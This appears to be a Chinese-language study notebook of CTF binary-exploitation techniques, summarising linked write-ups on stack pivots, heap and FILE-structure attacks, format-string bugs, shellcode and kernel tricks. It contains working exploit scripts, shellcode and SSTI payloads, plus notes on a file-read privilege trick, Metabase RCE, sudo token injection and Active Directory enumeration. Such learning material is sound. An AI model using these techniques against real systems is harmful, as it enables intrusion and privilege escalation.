- https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html ：只能覆盖rbp一个字节的栈迁移。这种栈迁移还是有巧合的因素，因为栈迁移基本配置是要两个leave;ret，这题正好main函数最后调用了一个函数，那个函数返回一次leave;ret，紧跟着main也leave;ret。不过这题还介绍了个ret slide。因为只能覆盖一个字节，加上PIE，不知道rbp最后具体在哪。那就尽量在那块填充很多个ret，直通rop chain。可以提高成功率，和nop slide作用差不多
- https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html ：fini_array利用+如何找fini_array地址。fini_array有两个entry，但是是倒着来的。因此应该先写第二个entry才能立即获取一次调用。这次调用完后，fini_array当前entry就变成了第一个，照应25条的“无法获得无限循环”。但是还有个办法，可以将调用fini_array的`__libc_csu_fini`函数的返回地址写成`__libc_csu_fini`，这样就又从fini_array的最后一个entry开始调用了。加上fini_array有两个entry，一个entry用于写诸如rop chain的东西，一个entry用于重新获取`__libc_csu_fini`调用，四舍五入就是无限循环
112. [Hunting](https://github.com/luisrodrigues154/Cyber-Security/tree/master/HackTheBox/Challenges/Pwn/Hunting)
- [Egghunter Shellcode](https://anubissec.github.io/Egghunter-Shellcode/)([64位](https://pentesterslife.blog/2017/11/24/x64-egg-hunting-in-linux-systems/))构造。这类shellcode用于在内存中找指定内容同时避免访问无效地址。目标通常开头有特殊字符串，shellcode便利用access测试某个内存页是否可访问，能访问就在当前内存页搜寻特殊字符串，不能访问就切换下一页。这样一直重复直到找到目标
113. [generic-rop-challenge](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Pwn/generic-rop-challenge)
- arm rop下binary自带的泄露libc通用gadget+libc里控制x0，x1，x2的gadget。部分gadget在 https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/ 也有介绍。rop为orw
114. shellcode题集合。已移至顶端
115. [minimal](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Pwn/minimal),[minimaler](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Pwn/minimaler)
- 极小elf rop题目。源码只有简单的：
```c
#include <stdio.h>
int main() {
  char buf[8];
  syscall(0, 0, buf, 0x900);
}
```
虽然不算什么知识点，但我觉得应该不能有比这还小的elf pwn题了吧？所以记录一下，说不定这么特殊的以后还会遇到呢？或者以后遇到稍微大点的elf也不怕了。minimal是getshell，minimaler是orw。其他解法： https://gist.github.com/unvariant/9ac05bc3214fdfd6835ac38617508a94 。这个思路之前没见过：利用栈迁移在bss段里构造假的Elf64_Rela, Elf64_Sym, 和symbol，然后调用dl_resolver加上合适的参数即可调用`system("/bin/sh")`。似乎连加沙盒的也能这样通解
115. [SHELLO-WORLD](https://github.com/JOvenOven/ctf-writeups/tree/main/TFC_CTF_2023/pwn/shello_world)
- pwntools FmtStr object使用
116. [format_level3](../../CTF/moectf/2023/Pwn/format_level3.md)
- bss段上的格式化字符串。之前其实记过，就是用args和三级指针。但是做这题时发现了一个如果本地偏移和远程不一样时（且无法获取远程dockerfile调试）的做法
117. [feedback](../../CTF/moectf/2023/Pwn/feedback.md)
- stdout利用。若地址未知，覆盖_IO_write_base的最后一个字节将其改小就能泄露libc地址。若地址已知，直接更改_IO_write_base和_IO_write_ptr实现任意地址读
- 一般都能成功，只有一种情况例外：_IO_write_base最后一个字节本身就很小，比如是`0x3`。这时改成`\x00`也只能泄露0x3个字节（`_IO_write_ptr`默认和`_IO_write_base`一样）
118. [Bad grades](https://github.com/luisrodrigues154/Cyber-Security/tree/master/HackTheBox/Challenges/Pwn/BadGrades)
- 当scanf遇见`.`,`+`,`-`输入时，会跳过，即参数的内存处不会被修改
119. [File Reader?](https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/#file-reader)
- glibc利用一些记录在内存中的数据判断一个chunk是否被double free。获取任意地址写后，三种方法修改数据使glibc忽视double free
  - overwrite the key (freed_chunk + 8) with nonsense (if the key is the same as the address of the first chunk, the one with size 0x290, libc thinks it's a double free)
  - change the size of the chunk (freed_chunk - 8) so it goes into a different tcache list than the one it's supposed to go in (libc checks for double free by looking at only one of the lists).
  - set the 0x50 size bin's head to 0 so the freed_chunk doesn't appear in the list.
120. [stiller-printf](https://eth007.me/blog/ctf/stiller-printf/)
- pie+只有一次格式化字符串漏洞+exit。可能是格式化字符串漏洞最难的一道题，需要在一次漏洞中直接无视pie修改返回地址而且需要保持1/3的通过率，导致单纯爆破肯定是不行的。需要同时利用多个指针链
  - 之前70条提过指针链不要用数字参数，这题继续加深理解。这个指的是如果想要利用指针链在同一次printf利用中修改二级指针+返回地址的话，就不要用类似`%numc%15$hn%numc%41$hn`的payload。因为printf内部调用的vfprintf在看到第一个`$`后会将后续全部的参数全部存到一个buf里，第一个`%15$hn`改完后，改`%41$hn`还用的是之前缓存的而不是刚才现改的值（这也告诉我们当后续没有其他要写的东西时，或者说最后一个是可以用数字偏移的）。解决办法是用%c拼凑过去：`%c%p%c%c%c%c%c%c%c%c%c%c%c%4894c%hn%165c%41$hhn`，让第一个%hn就在15的偏移处，就不用偏移了
  - printf的字符数只需要满足num mod 2^bit_length。比如用%hhn修改，只需要保证之前打印的字符数为0x09 mod 256即可
  - `%*c`的使用。这是一个特殊的format，使用时会拿两个参数，第一个是width，第二个是要打印的字符。比如：
  ```c
  printf("%*c", 42, 'a');
  //Output: "                                          a"
  ```
  利用这个format可以实现pie无leak情况下修改返回地址（但是成功率1/3）
- 一个解释得更明白的补充wp： https://ywhkkx.github.io/2023/09/06/LITCTF2023/#stiller-printf 。但是好像打错字了，"对其"应该是"对齐"
121. [Textsender](https://github.com/5kuuk/CTF-writeups/tree/main/sekai-2023/textsender)
- scanf函数的特点：当使用%s接受用户输入的字符串时，会在末尾填上`\x00`。off by null重灾区。另外，scanf接收到空格就自动截断，因此无法输入空格
- getline函数（`getline(char **lineptr, size_t *n, FILE *stream)`）内部调用了`_IO_getdelim`。当`*lineptr`为null或`*size`为0时，会自动malloc 120字节给`*lineptr`。若当前大小不够存储用户输入，该buffer会不断realloc为当前size的两倍。如果当前chunk后面是空闲的，realloc会基于当前地址延长当前chunk
- 作者将wp里使用的方法称为House of Botcake的变种。感觉更重要的是对getline的使用
```py
# heap feng shui
# the goal is overlapping the top chunk with a chunk containing name & content pointers
empty_tcache() #分配7个均在tcache范围里的chunk
add_message(b"a",b"b") # -> chunk U (0x200), it will go into unsorted bin once freed
set_sender(b"boop") # chunk S
send_all() #free全部chunk，先free刚才的chunk S再到其他的
empty_tcache(n=6) # 分配6个chunk，only chunk S left in 0x80 tcache bin (will be used+extended by getline)
fake_edit(b"Sender: "*128) # 这个函数内部使用了getline。因为使用的ptr是null，S就被malloc出来了。正好S后面是top chunk，getline (realloc) will extend S beyond tcache range, it will then be consolidated with U and the top chunk when subsequently freed（这个函数最后free了getline的lineptr，S前面的U是空闲的，两者合并，然后一起并入topchunk）
add_message(b"empty",b"bins") # empty heap bins。前面从tcache里拿了6个，这里再拿一个就把最开始的7个清空了
fake_edit(b"a"*(0x2a0-8)+p64(0x20|1)+b"Sender: \x00"*512) # reforge chunk S with size 0x20。这块比较神奇。这里edit的内容由于题目的特殊实现，并没有被写入任何一个之前malloc的chunk，而是进到getline函数，写入了从topchunk切下来的内存。b"a"*(0x2a0-8)是chunk U的大小，p64(0x20|1)+b"Sender: \x00"*512写入了chunk S的size和content（fd）
send_all() # overlapping chunks since S is freed and is also part of the top chunk。又free了一次chunk S，但是注意此时chunk S还在topchunk里
empty_tcache(n=6) # only S left in 0x20 tcache bin。之前改了chunk S的sizw，所以现在在0x20的bin里
add_message(b"victim",b"victim") # uses chunk S to store name and content pointers。0x20是题目中用来存储两个指针的struct的大小，所以这里拿到了chunk S来存储指针
# libc leak + got overwrite
# (replace name and content pointers of our victim message by got entries)
fake_edit(b"a"*(0x2a0-8) + p64(0x20|1) + p64(exe.got.free) * 2) #chunk U+chunk S size+free
drafts = print_all()
leak = drafts[7].split(b") ")[1][:6]
free_addr = unpack(leak,'all')
libc.address = free_addr - libc.sym.free
printx(free=free_addr)
printx(libc=libc.address)
edit_message(leak+b"\x00",p64(libc.sym.system)) #修改之前写入的free got为system
fake_edit(b"/bin/sh\x00")
io.interactive()
```
122. [Network Tools](https://snocc.dev/blog/sekai-nettools)
- rust bof题目。思路和普通的C程序一样，都是rop（甚至有时候还有csu）。不过这题不知道因为什么原因不能ret2libc，只能写/bin/sh到bss后调用binary里自带的execvp函数：`execvp("/bin/sh", [0])`。注意该函数的第二个参数是数组，传一个指向null的指针即可
123. [Algorithm Multitool](https://jt00000.github.io/2023/09/03/post_sekaictf2023_algorithm_multitool_en.html)
- c++ heap:[Do not use capturing lambdas that are coroutines](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Rcoro-capture)。c++的lambda有个语法，可以捕捉上文的变量传进lambda函数体。假如函数体内部使用coroutine，可能在co_await处退出，然后继续执行。然而退出后捕捉的变量会出作用域，然后被free。lambda内部继续使用这个变量的话会造成uaf
124. [one byte](https://github.com/giggsterpuku/CTF-Writeups/tree/main/DownUnderCTF/4.0/pwn/one%20byte)
- 栈上的off by one。如果溢出发生的变量是栈上唯一一个，且没有canary，这个byte会溢出到rbp/ebp的lsb。因为返回地址存储在栈上，如果能把rbp改成一块存储了win函数返回地址的内存，利用函数返回时的epilogue就能返回到win函数。如果栈地址未知，尽量将输入填充多个win函数，然后爆破最后一个字节尝试将rbp修改为输入那块内存
125. [ROPPENHEIMER](https://github.com/5kuuk/CTF-writeups/tree/main/ductf-2023/roppenheimer)
- c++ ordered_map collision。参考 https://codeforces.com/blog/entry/62393 ，构造特殊的key，使所有key均为某个质数的倍数即可让所有key碰撞。这个质数需要测试，如果当前测试的质数是目标的话，ordered_map的时间复杂度会上升到 $O(n^2)$
- 利用pop rsp进行栈迁移。如果栈迁移的位置不够写下完整ropchain，可以重新返回main继续利用漏洞。如果之前迁移的栈正好在main的栈变量里面，会使main的栈帧与栈变量重叠，可以直接rop，无需二次迁移
- 注意system调用时会往栈里写数据，因此调用时当前栈要可写。如果不可写，先用mprotect改当前所在内存权限
126. [shifty mem](https://gerrardtai.com/coding/ductf#shifty-mem)
- C语言的共享内存使用（shm_open）与条件竞争/TOCTOU
127. [tiny-pwn](https://www.youtube.com/watch?v=BRnMRdQJVeo)
- 一些编写shellcode时的技巧。假如程序允许的shellcode长度很短，可以考虑额外用read读取较长shellcode再执行：
```
xor ebx,ebx
push 3
pop eax
push 100
pop edx
int 0x80
```
使用push和pop修改寄存器的值要比使用mov更短。主要思路是将shellcode读取到当前eip指向的位置，然后从stdin获取第二阶段getshell shellcode时就能直接运行了。注意要保证第二阶段的shellcode对齐，比较简单粗暴的方法是在开头多放几个nop
128. [Cosmic Ray v2](https://www.youtube.com/watch?v=BRnMRdQJVeo)
- jmp系列指令（如JZ）机器码中有一个字节表示偏移。假如可程序可以翻转任意位置上的bit，将这类指令偏移字节的某个bit翻转有几率获取程序无限执行（假如当前函数下面正好是main的话）。有可能会跳到某个指令的中间，不过不是所有情况都会崩溃
- 写shellcode时一个可以考虑的位置是`deregister_tm_clones`函数
129. [LLM-Wrapper](https://www.youtube.com/watch?v=BRnMRdQJVeo)
- c++ pwn。c++内置的string是无法溢出的，但使用`c_str()`将其转换为纯C字符串时则有溢出的风险
- basic_string结构利用。参考第35条，当字符串的大小不超过16时Data Pointer就会存储在栈上，意味着当其他数据结构发生溢出时可以覆盖该指针。假设字符串B的Data Pointer被覆盖，那么程序打印B时打印的就是被覆盖的Data Pointer所指向的内容了。在利用bof漏洞写rop时，也要注意保留这些结构，不要一股脑a全填过去
130. [Igpay Atinlay Natoriay 3000](https://github.com/D13David/ctf-writeups/tree/main/buckeyectf23/pwn/ian_3000)
- rust的`&word[0..1]`默认word全部由单字节字符组成。若word是unicode，存储时就会用多个字节，分割时就会报错
131. [flag_sharing](https://github.com/HAM3131/hacking/tree/main/BuckeyeCTF/pwn/flag_sharing)
- ctf常用的题目容器nsjail可以进行side-channel cache attack。这种攻击简述就是，cpu在执行指令时需要访问内存，但是在计算机的角度来看，耗时较长。于是设计了一个cache，内存中之前访问过的指令会存到cache里，下次取就快很多了。直到某段时间后这段内存不用了或是没有空间了后，会flush cache，于是下一次访问又变慢了。部分处理器设计的cache是共享的，意味着不同cpu，进程都可以访问cache。所以可以利用某段指令访问的快慢程度进行测信道攻击。进程A执行某些指令，进程B访问进程A可能执行的区域，若某一段访问较快，说明这一段就是刚刚进程A访问的部分。泄露一段后手动flush cache，继续等待下一次攻击。可见若cache不共享，这种攻击是无法使用的
- 一些汇编指令
    - rdtsc：将时间戳读入edx:eax
    - `clflush [register]`：将register指向的地址处内存手动flush
    - mfence+lfence:防止后续指令先于前面的指令完毕前执行
132. [house-of-sus](https://www.youtube.com/watch?v=qA6ajf7qZtQ)
- libc 2.27 house of force
- 当one_gadget因为不满足条件无法使用时，可考虑借用“跳板”。例如，将malloc_hook改为one_gadget,然后将其他函数改为malloc。这样调用那个函数时会调用malloc进而调用one_gadget，但是栈的情况可能会不同让one_gadget得以使用
133. linux越权读文件。可以在 https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/generic/unsecvars.h 里找没有被题目ban的环境变量，比如RESOLV_HOST_CONF，可以用下面的步骤读文件：
```sh
RESOLV_HOST_CONF=/root/flag bash 2>&1
cat</dev/tcp/a/1
```
134. [memstream](https://github.com/itaybel/Weekly-CTF/blob/main/BlackHatMEA/pwn/memstream.md)
- 当pwndbg打开程序发现代码段不在`0x55***000`而是`0x7ff****000`时，说明这段代码是被mmaped的。这意味着程序段与ld.so的偏移是固定的，有可能ld.so的地址比程序段还要小。这种情况可能出现在被upx打包的程序
- ld.so会在可写段记录程序基地址，而且不止一个。当程序使用exit退出时，会跳到记录基址的那个地址+0x3d88。假设exit时rax为`*(0x7ffff7fef2e0) = 0x7ffff7ff7000`，执行指令`call [rax + 0x3d88]`就相当于跳转到`[0x7ffff7ff7000+0x3d88]`。通常情况下这里是`__do_global_dtors_aux`。假设ld.so在A和B处都记录了基地址，一种PIE下的利用思路是，利用partial write将A处的基地址改为getshell的函数（不确定one_gadget行不行？），然后再用一次partial write将B处的地址改为A-0x3d88。这样当rax=B时，内部地址为A-0x3d88，call的函数就是A处的one_gadget了
135. [profile](https://github.com/itaybel/Weekly-CTF/blob/main/BlackHatMEA/pwn/profile.md)
- 注意scanf的format。如果format是`%ld`，接收的就是8字节。如果存放输入的buffer是int这类只有4个字节的格式，就会有4字节的溢出。特别是在struct里，这溢出的4个字节通常就覆盖了下一个字段的指针
- free会检查chunk的size，不合格就会报错。所以在覆盖指针时要注意这点
136. [DEVPRO](https://github.com/nobodyisnobody/write-ups/tree/main/Blackhat.MEA.CTF.Finals.2023/pwn/devpro)
- 在linux里，从/dev/null读内容永远会返回end-of-file (EOF)，无论所读内容的长度。比如说用fread尝试读/dev/null的0x500的字节，fread会返回0，即没有读到任何内容
- open device时，会在堆上分配chunk给FILE结构体用来代表该device，后续对该device的读写与其息息相关。`_IO_write_ptr`到`_IO_buf_end`是所读内容的缓冲区，若所读内容长度大于等于缓冲区的长度，会被立即丢弃；反之会将读到的内容读入`_IO_write_ptr`所记录的缓冲区（这个字段攻击者可改，改成stdout后就能修改stdout从而获取FSOP了，其他地方也同理）。从哪里读字节由当前device的FILE结构体的`_fileno`决定，且可被攻击者利用溢出等方式修改。比如原本是3，从文件描述符为3的文件里读字节，改成0后就变成从stdin读了。溢出修改`_fileno`时记得保留`_chain`字段的值
- libc 2.38 FSOP。参考 https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout ，作者提供了利用的模板
137. [fortune](https://github.com/nobodyisnobody/write-ups/tree/main/Blackhat.MEA.CTF.Finals.2023/pwn/fortune)
- 利用ld.so link_map structure劫持程序控制流(82条的另一种利用方式)。参考 https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#2---targetting-ldso-link_map-structure 。`_dl_call_fini`里有一段：
```c
ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr + fini_array->d_un.d_ptr);
size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
while (sz-- > 0)
  ((fini_t) array[sz]) ();
```
`map->l_addr`通常为程序的基地址，`fini_array->d_un.d_ptr`也是一个固定的偏移（0x3d88）。所以如果修改`map->l_addr`为`map->l_addr+[one_gadget]-0x3d88`（[one_gadget]为存有one_gadget地址的指针），就能让程序执行one_gadget。这题利用格式化字符串直接在栈上找到`map->l_addr`并修改。找法很简单，gdb跟进到printf函数内部，然后vmmap找到程序基地址，使用`search --hex addr`(注意这里的addr为程序基地址的小端形式，要倒过来写。或者直接`search -p addr`，不用倒过来)就能找到几个存有基地址的指针。其中一个指针会在栈上（134条破案了，它们就是记录程序基地址的玩意）
- pwndbg调试PIE程序。今天终于找到解决办法了，利用pwndbg自带的brva即可
```py
context.terminal = ["tmux", "splitw", "-h"]
gdbscript='''
    si
    brva offset_of_instruction
    c
'''
p = gdb.debug("./pwn",gdbscript=gdbscript)
```
138. [Digital Circuit](https://chovid99.github.io/posts/tcp1p-ctf-2023/#digital-circuit)
- 个人觉得非常巧妙的栈迁移题，思路也值得学习。把栈迁移到bss段算常规操作，但是可输入的字节仍然不够构造完整的rop怎么办？wp利用这段代码：
```
        00401d23 48 8d 45 d0     LEA        RAX=>local_38,[RBP + -0x30]
        00401d27 ba 40 00        MOV        EDX,0x40
                 00 00
        00401d2c 48 89 c6        MOV        RSI,RAX
        00401d2f bf 00 00        MOV        EDI,0x0
                 00 00
        00401d34 e8 87 5e        CALL       read
                 05 00
```
中的`LEA RAX=>local_38,[RBP + -0x30]`多次读取payload至bss段，每次稍微往上挪一点，写完完整ropchain调用即可：
```py
payload = p64(pop_rdi) + p64(exe.sym.anu) + p64(pop_rsi) + p64(0) + p64(pop_r13_r14_r15)
payload += p64(canary)
payload += p64(new_rbp+0x40) #调整rbp
payload += p64(exe.sym.cool_thing2+182) # cool_thing2+182（LEA RAX=>local_38,[RBP + -0x30]）
r.sendafter(b'name?\n', payload) #目前栈迁移至new_rbp,所以这段payload读到了new_rbp-0x30
payload = p64(pop_rax) + p64(0x3b) + p64(pop_rax) + p64(0x3b) + p64(pop_r13_r14_r15) #用于跳过栈上的canary，rbp和返回地址
payload += p64(canary)
payload += p64(new_rbp+0x40*2)
payload += p64(exe.sym.cool_thing2+182) # cool_thing2+182
r.send(payload) #这段payload读到了new_rbp+0x40-0x30，就是上一段payload调整到的rbp
payload = p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(syscall_ret) + b'c'*8
payload += p64(canary)
payload += p64(new_rbp-0x40) #准备执行ropchain
payload += p64(exe.sym.cool_thing2+182) # cool_thing2+182
r.send(payload) #同理这段在new_rbp+0x40*2-0x30
payload = b'd'*0x28
payload += p64(canary)
payload += p64(0) #这个rbp已经不重要了
payload += p64(pop_rdi+1) #ret
r.send(payload) #new_rbp-0x40-0x30
#函数自带一个leave;ret，此时rsp为new_rbp-0x40+8.new_rbp-0x40是因为leave上半段的mov esp ebp，+8是因为leave下半段的pop ebp
#new_rbp-0x40+8正好是第一个payload的p64(pop_rdi)
```
139. [💀](https://chovid99.github.io/posts/tcp1p-ctf-2023/#heading)
- linux kernel pwn爆破kernel base+利用modprobe_path提权。利用任意地址读扫描`0xffffffff81000000`到`0xffffffffc0000000`，每次增加0x100000。当读取的内容里包含`/sbin/m`(即modprobe_path的开头)时，说明当前所在地址就是kernel base
- 另外，IDT的地址不会被KASLR影响，所以在获取AAR的情况下直接读这块地址即可获取kbase。参考 https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/PWN/skull
140. [tickery](https://chovid99.github.io/posts/tcp1p-ctf-2023/#tickery)
- glibc 2.37 safe linking+tcache poisoning+environ泄露栈地址+gets读取任意大小ropchain
- 可通过修改tcache metadata中的count字段修改tcache中各个大小堆块的数量。利用这点可以欺骗tcache让其以为某个bin满了，进而将堆块放入unsorted bin从而泄露地址。metadata位于堆内存的起始处，各个count字段的对应关系如下：
```
pwndbg> x/8gx 0x55555555b000
0x55555555b000: 0x0000000000000000      0x0000000000000291
0x55555555b010: 0x0001000200030004      0x0005000600070008
0x55555555b020: 0x0009000a000b000c      0x000d000e000f0010
0x55555555b030: 0x0011001200130014      0x0000000000000000
pwndbg> bins
tcachebins
0x20 [  4]: 0x0
0x30 [  3]: 0x0
0x40 [  2]: 0x0
0x50 [  1]: 0x0
0x60 [  8]: 0x0
0x70 [  7]: 0x0
0x80 [  6]: 0x0
0x90 [  5]: 0x0
0xa0 [ 12]: 0x0
0xb0 [ 11]: 0x0
0xc0 [ 10]: 0x0
0xd0 [  9]: 0x0
0xe0 [ 16]: 0x0
0xf0 [ 15]: 0x0
0x100 [ 14]: 0x0
0x110 [ 13]: 0x0
0x120 [ 20]: 0x0
0x130 [ 19]: 0x0
0x140 [ 18]: 0x0
0x150 [ 17]: 0x0
```
- 当seccomp只允许open，read，write时，仍然可以调用gets
141. 利用ANSI字符在终端实现RCE： https://www.youtube.com/watch?v=3T2Al3jdY38 。通常见到的ANSI字符可以改变终端的字体颜色，一些恶意的ANSI字符甚至可以直接RCE。攻击者可以用恶意ANSI字符访问网站，这串ANSI字符会记到日志文件中。当运维人员cat日志文件时即触发RCE
142. [tps_report](https://github.com/datajerk/ctf-write-ups/tree/master/redteamvillage2021/tps_report)
- arm32 bss段格式化字符串漏洞覆盖got表getshell
143. 利用scanf获取unsorted_bin chunk并泄露libc地址。参考 https://www.willsroot.io/2020/10/cuctf-2020-dr-xorisaurus-heap-writeup.html ，大致步骤如下：
- 分配足够的fastbin大小堆块（足够指的是合并后可得到比后续scanf所malloc的chunk大的large bin）并几乎全部free，只留下一个用于防止与top chunk合并
- 调用scanf，令scanf读取0x500个字节以上的数据。scanf内部会malloc一个0x500大小的chunk。由于这是个large bin，malloc时会触发malloc_consolidate，之前free的fastbin会整体合并并被放入unsorted_bin。malloc_consolidate之后继续scanf的malloc，又把合并后的chunk从unsorted bin中取出放进large bin。最后因为这个合并的chunk比scanf所要求的要大，于是割下0x500给scanf，剩下的放进unsorted bin
- 最后再malloc一个chunk，这个chunk的头部有unsorted bin带上的libc地址
144. [Not Malloc](https://github.com/nobodyisnobody/write-ups/tree/main/LakeCTF.Quals.2023/pwn/not.malloc)
- 利用TLS-Storage dtor_list实现程序控制流劫持。效果为控制rip及rdi： https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#5---code-execution-via-tls-storage-dtor_list-overwrite 。不过dtor_list是单向链表，可以将不同的函数串起来，每次都能用不同的参数。tls-storage一般在`ld-linux-x86-64.so.2`之前，有时候会在`libc.so.6`之前，因此只需一次对libc或ld.so的leak即可获取确切地址。要是执行的rop较长也可以根据wp的做法实现栈迁移
145. [capture the flaaaaaaaaaaaaag](https://jiravvit.github.io/231106-lakectf2023-PWN/)
- fread内部调用了malloc，用于存储读取的文件内容。当调用fclose时，这块内存被free，不过不会被清空
- 当getline函数读取一个字符时，实际存储进内存的是3个字符：输入的字符，换行符加上`\x00`
146. [unicomp](https://github.com/nobodyisnobody/write-ups/tree/main/CakeCTF.2023/sandbox/unicomp)
- 可以利用在shellcode中间夹垃圾字节的方式绕过unicorn的逐地址指令检查
- 其他做法：
  - https://blog.akiym.com/entry/2023/11/12/200742 ：程序只检查不能出现`\x0f\x05`，但可以用`cs syscall`代替。另外，syscall本身是通过python调用的，所以内存映射本身是不同的，将`/bin/sh`放入堆栈并执行的常见shell代码将无法工作
  - https://github.com/theoremoon/cakectf2023-public/tree/master/misc/unicomp ：使用`fs syscall`
147. [Seahorse Hide 'n' Seek](https://ctftime.org/writeup/38218)
- 6502汇编阅读+虚拟机。此题在虚拟机环境下出现了缓冲区溢出，可覆盖代码段为shellcode
- [Commodore 64 standard KERNAL functions](https://sta.c64.org/cbm64krnfunc.html):提供了FILE io SETLFS, SETNAM, LOAD，可用这些指令编写ORW shellcode
- 更多6502汇编pwn相关题目：
  - https://ctftime.org/writeup/38219 ：格式化字符串漏洞+ghidra里CONCAT的作用
  - https://ctftime.org/writeup/38220 ：ret2win
148. [lazynote](https://faraz.faith/2020-10-13-FSOP-lazynote/)
- libc 2.27 fsop stdout任意地址读/任意地址写/RCE
- 补充，任意地址读libc 2.38还能用： https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive
149. [Write Byte Where](https://github.com/nobodyisnobody/write-ups/tree/main/GlacierCTF.2023/pwn/Write.Byte.Where)
- 任意地址写单字节。程序用setbuf() disable了stdin, stderr, 和 stdout的buffering。禁用后，stdin的buffer从`_IO_buf_base`到`_IO_buf_end`只有一个字节，位于stdin结构体中间。如果能覆盖`_IO_buf_end`的LSB，就能延伸buffer，从而覆盖stdin后续的内容
- getchar函数会将读入的字符存放进stdin的buffer。注意不仅仅是一个char，而是输入的所有内容，只是函数只返回一个字符
- stdout FSOP RCE。调用puts函数即可触发FSOP
- 因为`_IO_buf_base`控制读入的字符被存到何处，所以写成函数的在栈上的返回地址即可执行rop： https://github.com/LosFuzzys/GlacierCTF2023_writeups/tree/main/pwn/WriteByteWhere
150. [35ShadesOfWasm](https://github.com/LosFuzzys/GlacierCTF2023_writeups/tree/main/pwn/35ShadesOfWasm)
- wasmtime[漏洞](https://github.com/advisories/GHSA-ff4p-7xrq-q5r8)，允许用户实现任意oob和oow
- 有了oow之后就能针对`_dl_call_fini`实现RCE
151. [flipper](https://github.com/LosFuzzys/GlacierCTF2023_writeups/tree/main/pwn/flipper)
- 此题允许kernel内任意翻转一bit。和用户空间的类似挑战差不多，可以将程序逻辑内的jnz翻转为jz，获取无数次翻转bit的机会
152. [go-sing-a-rop](https://www.youtube.com/watch?v=ANEz5TdS17w)
- 64位go语言程序buffer overflow+rop。基本一样的原理，只是go语言的某些字符串对象在rop时被覆盖从而程序崩溃，需要用gdb尽可能复原那些字符串对象（和c++一样？）
153. [fratm-carcerat](https://www.youtube.com/watch?v=ANEz5TdS17w)
- libc 2.26下的consolidate attack（用于off by null的情况，似乎是[house_of_einherjar](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c)）。作用是获取任意一处地址的内存
154. [Apethanto](https://github.com/niTROCket51/uni-ctf-2023-writeup/tree/main/Apethanto)
- nmap使用+如何修改/etc/hosts
- Metabase pre-auth RCE： https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ 。注意poc的构造会根据要攻击的实例的设置的不同而不同，但只要使用的Metabase版本是有漏洞的，就可以自己根据文章里的poc自己调试出别的poc。其他类似但有区别的做法：
  - https://sailingnn.github.io/htb-ctf-Apethanto/
- 当运行id命令时发现当前用户处于sudo组，说明当前用户可以root身份运行命令，只是不知道密码。若满足 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens 提到的条件（可用[pspy](https://github.com/DominicBreuker/pspy)监控linux进程），即可使用[sudo_inject](https://github.com/nongiach/sudo_inject)用root身份执行命令
155. [Umbrella](https://www.rayanle.cat/umbrella-htb-uni-ctf-2023/)
- nmap使用。如果扫出来的结果包含LDAP (389, 3268, 3269), DNS (53) 和 Kerberos (88)，表明扫描的机器可能是一台域控制器（domain controller）
- openssl分析ip所使用的TLS证书。nmap扫出来的LDAP域名，TLS证书上的名称和hostname都可以添加到/etc/hosts文件中方便后续访问
- network service exploitation tool NetExec（nxc）使用：
  - smb：enumerating file shares and users as anonymous and guest。获取keylab名称和内部的RC4密钥后就能直接拿文件了
  - ldap：enumerating users using an anonymous bind，用Kerberos协议检查某些账号是否存在于某个域名。如果得到`KDC_ERR_C_PRINCIPAL_UNKNOWN`就说明不存在。也可以在获取密码后尝试登录，若得到`STATUS_PASSWORD_MUST_CHANGE`，说明密码正确但需要更改。这种情况有几种情况可以远程改密码，参考 https://www.n00py.io/2021/09/resetting-expired-passwords-remotely 。登录成功后，可以用Bloodhound查看用户的权利以及域内是否有错误的配置
- [certipy](https://github.com/ly4k/Certipy)使用
- [ldeep](https://github.com/franc-pentest/ldeep)使用
- [impacket](https://github.com/fortra/impacket)中的[dacledit.py](https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py)使用，用于列出ACES并检查是否可以修改某些属性。修改可以用ldapmodify
- 可以直接请求Grafana的api datasource。如果请求PostgreSQL datasource没出错，就能利用PostgreSQL使用sql语句查询进而获取RCE
- a keytab is a file which allows you to store the different Kerberos keys of a principal。可以用klist命令提取某个keylab的RC4密钥
156. [AndroCat](https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/androcat)
- Android WebResourceResponse漏洞： https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/ 。`getLastPathSegment()`方法返回的内容是url decode后的，如果事先传入urlencode的payload，解码后就可能得到路径穿越。得到路径穿越后`shared_prefs/auth.xml`里可能有敏感内容（SharedPreferences会引用这个文件）
- 利用PDF渲染可进行server side xss的漏洞获取SSH Private Key
- NUNJUCKS nodejs SSTI漏洞利用时若遇见`Access to this API has been restricted`，这是nodejs的实验性功能，用于阻拦文件读写。可利用 [Permission model can be bypassed by specifying a path traversal sequence in a Buffer](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32004) 绕过，做法参考wp或是 https://hackerone.com/reports/2051257 (以下为ssti payload)：
```js
{{range.constructor("
try {
    const fs = process.binding('fs');
    let file = fs.readFileSync('/path_of_allow-fs-read/../flag', 0);
    return file;
} catch (err) {
  return err;
}
")()}}
```
```js
{{range.constructor("return process.binding('fs').readFileSync('/path_of_allow-fs-read/../flag', 0)")()}}
```
